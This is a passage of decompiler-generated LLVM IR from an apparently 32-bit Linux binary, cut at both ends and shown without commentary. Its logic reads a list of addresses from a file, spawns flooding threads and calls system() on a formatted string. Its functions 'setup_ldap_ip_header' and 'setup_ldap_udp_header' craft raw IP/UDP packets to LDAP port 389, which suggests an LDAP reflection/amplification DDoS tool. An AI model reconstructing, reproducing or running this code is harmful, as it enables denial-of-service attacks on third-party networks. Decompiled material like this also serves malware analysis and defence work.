  store i32 %v2_804d187, i32* %edx.global-to-local, align 4
  store i32 %v1_804d143, i32* %eax.global-to-local, align 4
  %v2_804d18f = load i32, i32* %v1_804d146, align 4
  store i32 %v2_804d18f, i32* %ecx.global-to-local, align 4
  store i32 %v1_804d143, i32* %eax.global-to-local, align 4
  %v2_804d197 = load i32, i32* %v1_804d146, align 4
  store i32 %v2_804d197, i32* @ebx, align 4
  store i32 %v1_804d143, i32* %eax.global-to-local, align 4
  %v2_804d19f = load i32, i32* %v1_804d146, align 4
  store i32 %v2_804d19f, i32* @esi, align 4
  store i32 %v1_804d143, i32* %eax.global-to-local, align 4
  %v2_804d1a7 = load i32, i32* %v1_804d146, align 4
  store i32 %v1_804d16c, i32* @edi, align 4
  %v2_804d1b7 = ptrtoint i32* %stack_var_-1104 to i32
  store i32 %v2_804d1b7, i32* %eax.global-to-local, align 4
  %v9_804d1be = call i32 @__GI_snprintf(i32 %v2_804d1b7, i32 %v1_804d16c, i32 ptrtoint ([166 x i8]* @global_var_8069550.176 to i32), i32 %v2_804d1a7, i32 %v2_804d19f, i32 %v2_804d197, i32 %v2_804d18f)
  store i32 %v2_804d1b7, i32* %eax.global-to-local, align 4
  %v2_804d1d0 = call i32 @system(i32 %v2_804d1b7)
  store i32 %v2_804d1d0, i32* %eax.global-to-local, align 4
  %v3_804d1dd = call i32 @__GI_time(i32* null)
  store i32 %v3_804d1dd, i32* %eax.global-to-local, align 4
  %v2_804d1e9 = call i32 @srand(i32 %v3_804d1dd)
  store i32 0, i32* @global_var_807e520.80, align 32
  store i32 128, i32* %eax.global-to-local, align 4
  %v2_804d210 = call i32 @malloc(i32 128)
  store i32 %v2_804d210, i32* %edx.global-to-local, align 4
  %v1_804d221 = inttoptr i32 %v2_804d210 to i8*
  store i32 %v2_804d210, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  store i32 128, i32* %ecx.global-to-local, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v5_804d228 = call i8* @_memset(i8* %v1_804d221, i32 0, i32 128)
  %v6_804d228 = ptrtoint i8* %v5_804d228 to i32
  store i32 %v6_804d228, i32* %ecx.global-to-local, align 4
  %v0_804d22a = load i32, i32* %edx.global-to-local, align 4
  %v1_804d232 = add i32 %arg4, 16
  store i32 %v1_804d232, i32* %eax.global-to-local, align 4
  %v1_804d235 = inttoptr i32 %v1_804d232 to i32*
  %v2_804d235 = load i32, i32* %v1_804d235, align 4
  store i32 %v2_804d235, i32* %eax.global-to-local, align 4
  %v2_804d23b = call i32 @atol(i32 %v2_804d235)
  %v1_804d249 = add i32 %arg4, 20
  store i32 %v1_804d249, i32* %eax.global-to-local, align 4
  %v1_804d24c = inttoptr i32 %v1_804d249 to i32*
  %v2_804d24c = load i32, i32* %v1_804d24c, align 4
  store i32 %v2_804d24c, i32* %eax.global-to-local, align 4
  %v2_804d252 = call i32 @atol(i32 %v2_804d24c)
  store i32 %v2_804d252, i32* @eax, align 4
  store i32 0, i32* @global_var_807d3c8.89, align 8
  store i64 0, i64* @global_var_807d500.88, align 256
  %v3_804d285 = call i32 @__GI_fopen(i32 ptrtoint ([7 x i8]* @global_var_80695f6.177 to i32), i32 ptrtoint ([2 x i8]* @global_var_8068ea3.83 to i32))
  store i32 %v3_804d285, i32* %eax.global-to-local, align 4
  %v8_804d407 = inttoptr i32 %v0_804d22a to i8*
  %v1_804d2a3 = and i32 %v0_804d22a, -256
  %v5_804d307 = add i32 %v0_804d22a, -1
  br label %dec_label_pc_804d3fe.outer

dec_label_pc_804d295:                             ; preds = %dec_label_pc_804d3fe
  store i32 -1, i32* %ecx.global-to-local, align 4
  store i32 %v1_804d2a3, i32* %eax.global-to-local, align 4
  %v3_804d2ac = call i32 @_strlen(i8* %v8_804d407)
  %v4_804d2ac = mul i32 %v3_804d2ac, -1
  %v5_804d2ac = add i32 %v4_804d2ac, -2
  store i32 %v5_804d2ac, i32* %ecx.global-to-local, align 4
  %v5_804d2b3 = sub i32 %v0_804d22a, %v4_804d2ac
  %v1_804d2b6 = add i32 %v5_804d2b3, -1
  store i32 %v1_804d2b6, i32* %eax.global-to-local, align 4
  %v1_804d2b7 = inttoptr i32 %v1_804d2b6 to i8*
  %v2_804d2b7 = load i8, i8* %v1_804d2b7, align 1
  %v3_804d2b7 = zext i8 %v2_804d2b7 to i32
  %v5_804d2b7 = and i32 %v1_804d2b6, -256
  %v6_804d2b7 = or i32 %v3_804d2b7, %v5_804d2b7
  store i32 %v6_804d2b7, i32* %eax.global-to-local, align 4
  %v10_804d2b9 = icmp eq i8 %v2_804d2b7, 10
  br i1 %v10_804d2b9, label %dec_label_pc_804d2e9, label %dec_label_pc_804d2bd

dec_label_pc_804d2bd:                             ; preds = %dec_label_pc_804d295
  store i32 -1, i32* %ecx.global-to-local, align 4
  store i32 %v1_804d2a3, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v0_804d22a, i32* @edi, align 4
  %v3_804d2d4 = call i32 @_strlen(i8* %v8_804d407)
  %v4_804d2d4 = mul i32 %v3_804d2d4, -1
  %v5_804d2d4 = add i32 %v4_804d2d4, -2
  store i32 %v5_804d2d4, i32* @ecx, align 4
  %v5_804d2db = sub i32 %v0_804d22a, %v4_804d2d4
  %v1_804d2de = add i32 %v5_804d2db, -1
  store i32 %v1_804d2de, i32* %eax.global-to-local, align 4
  %v1_804d2df = inttoptr i32 %v1_804d2de to i8*
  %v2_804d2df = load i8, i8* %v1_804d2df, align 1
  %v3_804d2df = zext i8 %v2_804d2df to i32
  %v5_804d2df = and i32 %v1_804d2de, -256
  %v6_804d2df = or i32 %v3_804d2df, %v5_804d2df
  store i32 %v6_804d2df, i32* %eax.global-to-local, align 4
  %v10_804d2e1 = icmp eq i8 %v2_804d2df, 13
  %v1_804d2e3 = icmp eq i1 %v10_804d2e1, false
  br i1 %v1_804d2e3, label %dec_label_pc_804d3fe, label %dec_label_pc_804d2e9

dec_label_pc_804d2e9:                             ; preds = %dec_label_pc_804d2bd, %dec_label_pc_804d295
  store i32 -1, i32* %ecx.global-to-local, align 4
  store i32 %v0_804d22a, i32* %stack_var_-1148, align 4
  store i32 %v1_804d2a3, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v0_804d22a, i32* @edi, align 4
  %v3_804d300 = call i32 @_strlen(i8* %v8_804d407)
  %v4_804d300 = mul i32 %v3_804d300, -1
  %v5_804d300 = add i32 %v4_804d300, -2
  store i32 %v5_804d300, i32* @ecx, align 4
  %v1_804d30a = sub i32 %v5_804d307, %v4_804d300
  %v1_804d30b = inttoptr i32 %v1_804d30a to i8*
  store i8 0, i8* %v1_804d30b, align 1
  %v0_804d30e = load i32, i32* @global_var_807e520.80, align 32
  store i32 %v0_804d30e, i32* %eax.global-to-local, align 4
  %v1_804d313 = icmp eq i32 %v0_804d30e, 0
  %v1_804d315 = icmp eq i1 %v1_804d313, false
  %v2_804d38f = call i32 @malloc(i32 540)
  store i32 %v2_804d38f, i32* %eax.global-to-local, align 4
  br i1 %v1_804d315, label %dec_label_pc_804d387, label %dec_label_pc_804d317

dec_label_pc_804d317:                             ; preds = %dec_label_pc_804d2e9
  store i32 %v2_804d38f, i32* @global_var_807e520.80, align 32
  store i32 %v2_804d38f, i32* %eax.global-to-local, align 4
  %v1_804d331 = inttoptr i32 %v2_804d38f to i32*
  store i32 0, i32* %v1_804d331, align 4
  %v0_804d337 = load i32, i32* %eax.global-to-local, align 4
  %v1_804d337 = add i32 %v0_804d337, 4
  %v2_804d337 = inttoptr i32 %v1_804d337 to i32*
  store i32 0, i32* %v2_804d337, align 4
  %v0_804d33e = load i32, i32* %eax.global-to-local, align 4
  %v1_804d33e = add i32 %v0_804d33e, 8
  %v2_804d33e = inttoptr i32 %v1_804d33e to i32*
  store i32 0, i32* %v2_804d33e, align 4
  %v0_804d345 = load i32, i32* %eax.global-to-local, align 4
  %v1_804d345 = add i32 %v0_804d345, 12
  %v2_804d345 = inttoptr i32 %v1_804d345 to i32*
  store i32 0, i32* %v2_804d345, align 4
  %v0_804d34c = load i32, i32* @global_var_807e520.80, align 32
  store i32 %v0_804d34c, i32* @ebx, align 4
  %v2_804d358 = call i32 @inet_addr(i32 %v0_804d22a)
  %v1_804d360 = load i32, i32* @ebx, align 4
  %v2_804d360 = add i32 %v1_804d360, 4
  %v3_804d360 = inttoptr i32 %v2_804d360 to i32*
  store i32 %v2_804d358, i32* %v3_804d360, align 4
  %v0_804d363 = load i32, i32* @global_var_807e520.80, align 32
  %v2_804d36e = add i32 %v0_804d363, 532
  %v3_804d36e = inttoptr i32 %v2_804d36e to i32*
  store i32 %v0_804d363, i32* %v3_804d36e, align 4
  %v0_804d374 = load i32, i32* @global_var_807e520.80, align 32
  store i32 %v0_804d374, i32* @edx, align 4
  store i32 %v0_804d374, i32* %eax.global-to-local, align 4
  %v2_804d37f = add i32 %v0_804d374, 536
  %v3_804d37f = inttoptr i32 %v2_804d37f to i32*
  store i32 %v0_804d374, i32* %v3_804d37f, align 4
  br label %dec_label_pc_804d3fb

dec_label_pc_804d387:                             ; preds = %dec_label_pc_804d2e9
  store i32 %v2_804d38f, i32* @edx, align 4
  store i32 540, i32* %eax.global-to-local, align 4
  %v5_804d3aa = inttoptr i32 %v2_804d38f to i8*
  %v5_804d3ab = call i32 @__GI_memset(i8* %v5_804d3aa, i32 0, i32 540)
  store i32 %v5_804d3ab, i32* %eax.global-to-local, align 4
  %v2_804d3b9 = call i32 @inet_addr(i32 %v0_804d22a)
  %v2_804d3c6 = add i32 %v2_804d38f, 4
  %v3_804d3c6 = inttoptr i32 %v2_804d3c6 to i32*
  store i32 %v2_804d3b9, i32* %v3_804d3c6, align 4
  %v0_804d3c9 = load i32, i32* @global_var_807e520.80, align 32
  store i32 %v0_804d3c9, i32* %edx.global-to-local, align 4
  %v2_804d3d2 = add i32 %v2_804d38f, 536
  %v3_804d3d2 = inttoptr i32 %v2_804d3d2 to i32*
  store i32 %v0_804d3c9, i32* %v3_804d3d2, align 4
  %v0_804d3d8 = load i32, i32* @global_var_807e520.80, align 32
  store i32 %v0_804d3d8, i32* %eax.global-to-local, align 4
  %v1_804d3dd = add i32 %v0_804d3d8, 532
  %v2_804d3dd = inttoptr i32 %v1_804d3dd to i32*
  %v3_804d3dd = load i32, i32* %v2_804d3dd, align 4
  %v2_804d3e6 = add i32 %v2_804d38f, 532
  %v3_804d3e6 = inttoptr i32 %v2_804d3e6 to i32*
  store i32 %v3_804d3dd, i32* %v3_804d3e6, align 4
  %v0_804d3ec = load i32, i32* @global_var_807e520.80, align 32
  store i32 %v0_804d3ec, i32* @edx, align 4
  store i32 %v2_804d38f, i32* %eax.global-to-local, align 4
  %v2_804d3f5 = add i32 %v0_804d3ec, 532
  %v3_804d3f5 = inttoptr i32 %v2_804d3f5 to i32*
  store i32 %v2_804d38f, i32* %v3_804d3f5, align 4
  br label %dec_label_pc_804d3fb

dec_label_pc_804d3fb:                             ; preds = %dec_label_pc_804d317, %dec_label_pc_804d387
  br label %dec_label_pc_804d3fe.outer

dec_label_pc_804d3fe.outer:                       ; preds = %dec_label_pc_804d3fb, %dec_label_pc_804d181
  br label %dec_label_pc_804d3fe

dec_label_pc_804d3fe:                             ; preds = %dec_label_pc_804d3fe.outer, %dec_label_pc_804d2bd
  %v4_804d40a = call i32 @fgets(i32 %v0_804d22a, i32 128, i32 %v3_804d285)
  store i32 %v4_804d40a, i32* %eax.global-to-local, align 4
  %v1_804d412 = icmp eq i32 %v4_804d40a, 0
  %v1_804d414 = icmp eq i1 %v1_804d412, false
  br i1 %v1_804d414, label %dec_label_pc_804d295, label %dec_label_pc_804d41a

dec_label_pc_804d41a:                             ; preds = %dec_label_pc_804d3fe
  %v0_804d41a = load i32, i32* @global_var_807e520.80, align 32
  store i32 %v0_804d41a, i32* %eax.global-to-local, align 4
  %v1_804d41f = add i32 %v0_804d41a, 532
  %v2_804d41f = inttoptr i32 %v1_804d41f to i32*
  %v3_804d41f = load i32, i32* %v2_804d41f, align 4
  %v2_804d42b = mul i32 %v2_804d23b, 4
  %v1_804d431 = add i32 %v2_804d42b, 30
  %v2_804d434 = and i32 %v1_804d431, -16
  %v2_804d43a = sub i32 %v7_804d0c5, %v2_804d434
  %v1_804d448 = add i32 %v2_804d43a, 15
  %v2_804d44b = and i32 %v1_804d448, -16
  %v1_804d46c = add i32 %arg4, 4
  store i32 %v1_804d46c, i32* %eax.global-to-local, align 4
  %v1_804d46f = inttoptr i32 %v1_804d46c to i32*
  %v2_804d46f = load i32, i32* %v1_804d46f, align 4
  store i32 %v2_804d46f, i32* %eax.global-to-local, align 4
  %v2_804d474 = add i32 %v2_804d43a, -16
  %v3_804d474 = inttoptr i32 %v2_804d474 to i32*
  store i32 %v2_804d46f, i32* %v3_804d474, align 4
  %v1_804d475 = call i32 @inet_addr(i32 %v2_804d44b)
  %v0_804d47a = load i32, i32* @esp, align 4
  %v1_804d47a = add i32 %v0_804d47a, 16
  store i32 %v2_804d23b, i32* %edx.global-to-local, align 4
  %v2_804d48e = mul i32 %v2_804d23b, 24
  %v1_804d494 = add i32 %v2_804d48e, 30
  %v2_804d497 = and i32 %v1_804d494, -16
  %v2_804d49d = sub i32 %v1_804d47a, %v2_804d497
  %v1_804d4ab = add i32 %v2_804d49d, 15
  %v2_804d4ae = and i32 %v1_804d4ab, -16
  store i32 %v2_804d4ae, i32* @edi, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v5_804d57364 = icmp sgt i32 %v2_804d23b, 0
  br i1 %v5_804d57364, label %dec_label_pc_804d4cf.lr.ph, label %dec_label_pc_804d579

dec_label_pc_804d4cf.lr.ph:                       ; preds = %dec_label_pc_804d41a
  %v3_804d501 = or i32 %v2_804d4ae, 8
  br label %dec_label_pc_804d4cf

dec_label_pc_804d4cf:                             ; preds = %dec_label_pc_804d4cf, %dec_label_pc_804d4cf.lr.ph
  %storemerge65 = phi i32 [ 0, %dec_label_pc_804d4cf.lr.ph ], [ %v4_804d56a, %dec_label_pc_804d4cf ]
  %v1_804d4db = mul i32 %storemerge65, 24
  %v3_804d4e5 = add i32 %v1_804d4db, %v2_804d4ae
  %v4_804d4e5 = inttoptr i32 %v3_804d4e5 to i32*
  store i32 %storemerge65, i32* %v4_804d4e5, align 8
  store i32 %v2_804d4ae, i32* %ecx.global-to-local, align 4
  store i32 %v1_804d4db, i32* %edx.global-to-local, align 4
  %v4_804d501 = add i32 %v3_804d501, %v1_804d4db
  %v5_804d501 = inttoptr i32 %v4_804d501 to i32*
  store i32 2, i32* %v5_804d501, align 8
  %v1_804d50b = load i32, i32* %edx.global-to-local, align 4
  %v2_804d50b = load i32, i32* %ecx.global-to-local, align 4
  %v3_804d50b = add i32 %v1_804d50b, 12
  %v4_804d50b = add i32 %v3_804d50b, %v2_804d50b
  %v5_804d50b = inttoptr i32 %v4_804d50b to i32*
  store i32 %v1_804d475, i32* %v5_804d50b, align 4
  %v1_804d515 = load i32, i32* %edx.global-to-local, align 4
  %v2_804d515 = load i32, i32* %ecx.global-to-local, align 4
  %v3_804d515 = add i32 %v1_804d515, 16
  %v4_804d515 = add i32 %v3_804d515, %v2_804d515
  %v5_804d515 = inttoptr i32 %v4_804d515 to i32*
  %v1_804d51f = load i32, i32* %edx.global-to-local, align 4
  %v2_804d51f = load i32, i32* %ecx.global-to-local, align 4
  %v3_804d51f = add i32 %v1_804d51f, 20
  %v4_804d51f = add i32 %v3_804d51f, %v2_804d51f
  %v5_804d51f = inttoptr i32 %v4_804d51f to i32*
  %v1_804d534 = or i32 %v3_804d4e5, 4
  %v2_804d53a = inttoptr i32 %v1_804d534 to i32*
  store i32 %v3_804d41f, i32* %v2_804d53a, align 4
  store i32 %v3_804d4e5, i32* @ecx, align 4
  store i32 %v2_804d44b, i32* %edx.global-to-local, align 4
  %v2_804d553 = mul i32 %storemerge65, 4
  %v2_804d556 = add i32 %v2_804d553, %v2_804d44b
  store i32 %v2_804d556, i32* %eax.global-to-local, align 4
  %v1_804d559 = load i32, i32* @esp, align 4
  %v2_804d559 = add i32 %v1_804d559, -4
  %v3_804d559 = inttoptr i32 %v2_804d559 to i32*
  store i32 %v3_804d4e5, i32* %v3_804d559, align 4
  %v1_804d55a = add i32 %v1_804d559, -8
  %v2_804d55a = inttoptr i32 %v1_804d55a to i32*
  store i32 134532698, i32* %v2_804d55a, align 4
  %v1_804d55f = add i32 %v1_804d559, -12
  %v2_804d55f = inttoptr i32 %v1_804d55f to i32*
  store i32 0, i32* %v2_804d55f, align 4
  %v0_804d561 = load i32, i32* %eax.global-to-local, align 4
  %v2_804d561 = add i32 %v1_804d559, -16
  %v3_804d561 = inttoptr i32 %v2_804d561 to i32*
  store i32 %v0_804d561, i32* %v3_804d561, align 4
  %v0_804d562 = call i32 @pthread_create()
  %v0_804d567 = load i32, i32* @esp, align 4
  %v1_804d567 = add i32 %v0_804d567, 16
  %v4_804d56a = add nuw nsw i32 %storemerge65, 1
  store i32 %v4_804d56a, i32* %eax.global-to-local, align 4
  %exitcond = icmp eq i32 %v4_804d56a, %v2_804d23b
  br i1 %exitcond, label %dec_label_pc_804d579, label %dec_label_pc_804d4cf

dec_label_pc_804d579:                             ; preds = %dec_label_pc_804d4cf, %dec_label_pc_804d41a
  %v1_804d581.lcssa = phi i32 [ %v2_804d49d, %dec_label_pc_804d41a ], [ %v1_804d567, %dec_label_pc_804d4cf ]
  %storemerge.lcssa = phi i32 [ 0, %dec_label_pc_804d41a ], [ %v2_804d23b, %dec_label_pc_804d4cf ]
  store i32 %v1_804d46c, i32* %eax.global-to-local, align 4
  %v2_804d57f = load i32, i32* %v1_804d46f, align 4
  store i32 %v2_804d57f, i32* %eax.global-to-local, align 4
  %v2_804d581 = add i32 %v1_804d581.lcssa, -4
  %v3_804d581 = inttoptr i32 %v2_804d581 to i32*
  store i32 %v2_804d57f, i32* %v3_804d581, align 4
  %v5_804d582 = add i32 %v1_804d581.lcssa, -8
  %v6_804d582 = inttoptr i32 %v5_804d582 to i32*
  store i32 %arg2, i32* %v6_804d582, align 4
  %v1_804d585 = add i32 %v1_804d581.lcssa, -12
  %v2_804d585 = inttoptr i32 %v1_804d585 to i32*
  store i32 ptrtoint ([32 x i8]* @global_var_8069600.178 to i32), i32* %v2_804d585, align 4
  %v5_804d58a = add i32 %v1_804d581.lcssa, -16
  %v6_804d58a = inttoptr i32 %v5_804d58a to i32*
  store i32 %arg1, i32* %v6_804d58a, align 4
  %v2_804d58d = call i32 @Send(i32 %storemerge.lcssa, i32 128)
  %v0_804d592 = load i32, i32* @esp, align 4
  store i32 %v1_804d138, i32* %eax.global-to-local, align 4
  %v2_804d5a2 = load i32, i32* %v1_804d13b, align 4
  store i32 %v2_804d5a2, i32* %eax.global-to-local, align 4
  %v3_804d5a7 = inttoptr i32 %v0_804d592 to i32*
  store i32 %v2_804d5a2, i32* %v3_804d5a7, align 4
  %v1_804d5a8 = call i32 @atol(i32 0)
  %v0_804d5ad = load i32, i32* @esp, align 4
  %v9_804d5b0 = mul i32 %v1_804d5a8, 20
  store i32 %v9_804d5b0, i32* %eax.global-to-local, align 4
  %v7_804d5b7 = icmp sgt i32 %v9_804d5b0, 0
  br i1 %v7_804d5b7, label %dec_label_pc_804d5bd, label %dec_label_pc_804d699

dec_label_pc_804d5bd:                             ; preds = %dec_label_pc_804d579
  store i32 5000, i32* %edx.global-to-local, align 4
  store i32 50000, i32* %eax.global-to-local, align 4
  %v3_804d5eb = inttoptr i32 %v0_804d5ad to i32*
  store i32 50000, i32* %v3_804d5eb, align 4
  %v2_804d5ec = call i32 @usleep(i64 0)
  %v0_804d5f4 = load i64, i64* @global_var_807d500.88, align 8
  %sext = mul i64 %v0_804d5f4, 4294967296
  %v2_804d5fd = sdiv i64 %sext, 4294967296
  %v4_804d5fd = mul nsw i64 %v2_804d5fd, 20
  %v5_804d5fd = trunc i64 %v4_804d5fd to i32
  store i32 %v5_804d5fd, i32* %edx.global-to-local, align 4
  %tmp67 = icmp ugt i32 %v5_804d5fd, %v2_804d252
  %v0_804d62c = load i32, i32* @global_var_807d3c8.89, align 8
  store i32 %v0_804d62c, i32* %eax.global-to-local, align 4
  br i1 %tmp67, label %dec_label_pc_804d607, label %dec_label_pc_804d62c

dec_label_pc_804d607:                             ; preds = %dec_label_pc_804d5bd
  %tmp57 = icmp slt i32 %v0_804d62c, 1
  %tmp58 = icmp eq i1 %tmp57, false
  br i1 %tmp58, label %dec_label_pc_804d61f, label %dec_label_pc_804d610

dec_label_pc_804d610:                             ; preds = %dec_label_pc_804d607
  %v0_804d610 = load i32, i32* @global_var_806ffa8.90, align 8
  %v1_804d615 = add i32 %v0_804d610, 100
  store i32 %v1_804d615, i32* %eax.global-to-local, align 4
  store i32 %v1_804d615, i32* @global_var_806ffa8.90, align 8
  br label %dec_label_pc_804d65a

dec_label_pc_804d61f:                             ; preds = %dec_label_pc_804d607
  %v1_804d624 = add i32 %v0_804d62c, -1
  store i32 %v1_804d624, i32* %eax.global-to-local, align 4
  store i32 %v1_804d624, i32* @global_var_807d3c8.89, align 8
  br label %dec_label_pc_804d65a

dec_label_pc_804d62c:                             ; preds = %dec_label_pc_804d5bd
  %v1_804d631 = add i32 %v0_804d62c, 1
  store i32 %v1_804d631, i32* @global_var_807d3c8.89, align 8
  %v0_804d637 = load i32, i32* @global_var_806ffa8.90, align 8
  store i32 %v0_804d637, i32* %eax.global-to-local, align 4
  %v1_804d63c = add i32 %v0_804d637, -25
  %v5_804d63c = icmp ult i32 %v0_804d637, 25
  %v9_804d63c = icmp eq i32 %v1_804d63c, 0
  %v2_804d63f = or i1 %v5_804d63c, %v9_804d63c
  br i1 %v2_804d63f, label %dec_label_pc_804d650, label %dec_label_pc_804d641

dec_label_pc_804d641:                             ; preds = %dec_label_pc_804d62c
  store i32 %v1_804d63c, i32* %eax.global-to-local, align 4
  store i32 %v1_804d63c, i32* @global_var_806ffa8.90, align 8
  br label %dec_label_pc_804d65a

dec_label_pc_804d650:                             ; preds = %dec_label_pc_804d62c
  store i32 0, i32* @global_var_806ffa8.90, align 8
  br label %dec_label_pc_804d65a

dec_label_pc_804d65a:                             ; preds = %dec_label_pc_804d641, %dec_label_pc_804d61f, %dec_label_pc_804d610, %dec_label_pc_804d650
  store i64 0, i64* @global_var_807d500.88, align 256
  %v5_804d67c = add i32 %v2_804d13b, %v3_804d12a
  br label %dec_label_pc_804d664

dec_label_pc_804d664:                             ; preds = %dec_label_pc_804d694, %dec_label_pc_804d65a
  %stack_var_-60.0 = phi i32 [ %tmp, %dec_label_pc_804d65a ], [ %v4_804d694, %dec_label_pc_804d694 ]
  %v7_804d668 = icmp sgt i32 %stack_var_-60.0, 99
  br i1 %v7_804d668, label %dec_label_pc_804d66a, label %dec_label_pc_804d694

dec_label_pc_804d66a:                             ; preds = %dec_label_pc_804d664
  %v0_804d66a = load i32, i32* @esp, align 4
  %v1_804d66d = add i32 %v0_804d66a, -16
  %v2_804d66d = inttoptr i32 %v1_804d66d to i32*
  store i32 0, i32* %v2_804d66d, align 4
  %v2_804d66f = call i32 @__GI_time(i32* null)
  %v0_804d674 = load i32, i32* @esp, align 4
  store i32 %v2_804d66f, i32* %edx.global-to-local, align 4
  store i32 %v5_804d67c, i32* %eax.global-to-local, align 4
  %v7_804d67f = icmp ult i32 %v2_804d66f, %v5_804d67c
  br i1 %v7_804d67f, label %dec_label_pc_804d694, label %dec_label_pc_804d683

dec_label_pc_804d683:                             ; preds = %dec_label_pc_804d66a
  %v2_804d686 = inttoptr i32 %v0_804d674 to i32*
  store i32 0, i32* %v2_804d686, align 4
  %v1_804d688 = call i32 @__GI_exit(i32 0)
  store i32 %v1_804d688, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d694

dec_label_pc_804d694:                             ; preds = %dec_label_pc_804d683, %dec_label_pc_804d66a, %dec_label_pc_804d664
  %stack_var_-60.1 = phi i32 [ %stack_var_-60.0, %dec_label_pc_804d664 ], [ 0, %dec_label_pc_804d66a ], [ 0, %dec_label_pc_804d683 ]
  %v4_804d694 = add i32 %stack_var_-60.1, 1
  br label %dec_label_pc_804d664

dec_label_pc_804d699:                             ; preds = %dec_label_pc_804d579
  %v2_804d69c = inttoptr i32 %v0_804d5ad to i32*
  store i32 0, i32* %v2_804d69c, align 4
  %v1_804d69e = call i32 @__GI_exit(i32 %tmp)
  store i32 %v1_804d69e, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d6a3

dec_label_pc_804d6a3:                             ; preds = %dec_label_pc_804d125, %entry, %dec_label_pc_804d699
  %v0_804d6b0 = phi i32 [ %v1_804d16c, %dec_label_pc_804d125 ], [ %v1_804d0c8, %entry ], [ %v1_804d69e, %dec_label_pc_804d699 ]
  ret i32 %v0_804d6b0

; uselistorder directives
  uselistorder i32 %v1_804d63c, { 1, 0, 2 }
  uselistorder i32 %v0_804d62c, { 2, 1, 0, 3 }
  uselistorder i32 %v9_804d5b0, { 1, 0 }
  uselistorder i32 %v0_804d5ad, { 1, 0 }
  uselistorder i32 %v3_804d4e5, { 1, 0, 2, 3 }
  uselistorder i32 %v1_804d4db, { 0, 2, 1 }
  uselistorder i32 %storemerge65, { 2, 0, 1, 3 }
  uselistorder i32 %v2_804d4ae, { 1, 2, 3, 0 }
  uselistorder i32 %v2_804d44b, { 0, 2, 1 }
  uselistorder i32 %v0_804d374, { 1, 0, 2, 3 }
  uselistorder i32 %v0_804d363, { 1, 0 }
  uselistorder i32 %v2_804d38f, { 2, 1, 3, 4, 5, 0, 9, 8, 7, 6, 10 }
  uselistorder i32 %v2_804d23b, { 0, 1, 2, 4, 5, 3 }
  uselistorder i32 %v0_804d22a, { 10, 5, 4, 7, 6, 1, 3, 2, 0, 8, 9 }
  uselistorder i32 %v2_804d210, { 2, 1, 0 }
  uselistorder i32 %v4_804d174, { 1, 0 }
  uselistorder i32 %v4_804d0ff, { 1, 0 }
  uselistorder i32* %stack_var_-1164, { 0, 1, 3, 2 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 6, 4, 5, 7, 8, 9, 10, 11, 12, 13 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 7, 6, 8, 9, 10, 11, 12, 13, 16, 14, 15, 64, 17, 18, 19, 38, 20, 21, 22, 23, 25, 26, 27, 28, 29, 24, 30, 31, 32, 33, 34, 35, 36, 37, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63 }
  uselistorder i32 %arg4, { 4, 3, 2, 1, 0 }
  uselistorder i32 %arg2, { 2, 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804d6a3, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804d65a, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_804d3fb, { 1, 0 }
  uselistorder label %dec_label_pc_804d125, { 1, 0 }
  uselistorder label %dec_label_pc_804d0ff, { 1, 0 }
}

define i32 @setup_ldap_ip_header(i8* %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_804d6b1 = load i32, i32* @ebp, align 4
  store i32 %v0_804d6b1, i32* %stack_var_-4, align 4
  %v4_804d6b7 = ptrtoint i8* %arg1 to i32
  store i8 69, i8* %arg1, align 1
  %v1_804d6d4 = add i32 %v4_804d6b7, 1
  %v2_804d6d4 = inttoptr i32 %v1_804d6d4 to i8*
  store i8 0, i8* %v2_804d6d4, align 1
  %v1_804d6db = add i32 %v4_804d6b7, 2
  %v2_804d6db = inttoptr i32 %v1_804d6db to i16*
  store i16 79, i16* %v2_804d6db, align 2
  %v2_804d6e9 = call i32 @htonl(i32 54321)
  %v3_804d6e9 = trunc i32 %v2_804d6e9 to i16
  %sext = mul i32 %v2_804d6e9, 65536
  %v1_804d6f1 = sdiv i32 %sext, 65536
  store i32 %v1_804d6f1, i32* @edx, align 4
  %v3_804d6f6 = add i32 %v4_804d6b7, 4
  %v4_804d6f6 = inttoptr i32 %v3_804d6f6 to i16*
  store i16 %v3_804d6e9, i16* %v4_804d6f6, align 2
  %v1_804d6fd = add i32 %v4_804d6b7, 6
  %v2_804d6fd = inttoptr i32 %v1_804d6fd to i16*
  store i16 0, i16* %v2_804d6fd, align 2
  %v1_804d706 = add i32 %v4_804d6b7, 8
  %v2_804d706 = inttoptr i32 %v1_804d706 to i8*
  store i8 -1, i8* %v2_804d706, align 1
  %v1_804d70d = add i32 %v4_804d6b7, 9
  %v2_804d70d = inttoptr i32 %v1_804d70d to i8*
  store i8 17, i8* %v2_804d70d, align 1
  %v1_804d714 = add i32 %v4_804d6b7, 10
  %v2_804d714 = inttoptr i32 %v1_804d714 to i16*
  store i16 0, i16* %v2_804d714, align 2
  %v2_804d722 = call i32 @inet_addr(i32 ptrtoint ([14 x i8]* @global_var_8068d85.78 to i32))
  %v3_804d72f = add i32 %v4_804d6b7, 12
  %v4_804d72f = inttoptr i32 %v3_804d72f to i32*
  store i32 %v2_804d722, i32* %v4_804d72f, align 4
  %v2_804d732 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804d732, i32* @ebp, align 4
  ret i32 %v4_804d6b7
}

define i32 @setup_ldap_udp_header(i16* %arg1) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v0_804d738 = load i32, i32* @esi, align 4
  store i32 %v0_804d738, i32* %stack_var_-12, align 4
  %v1_804d741 = call i32 @htons(i32 5678)
  %v2_804d741 = trunc i32 %v1_804d741 to i16
  %v4_804d74b = ptrtoint i16* %arg1 to i32
  store i16 %v2_804d741, i16* %arg1, align 2
  %v1_804d759 = call i32 @htons(i32 389)
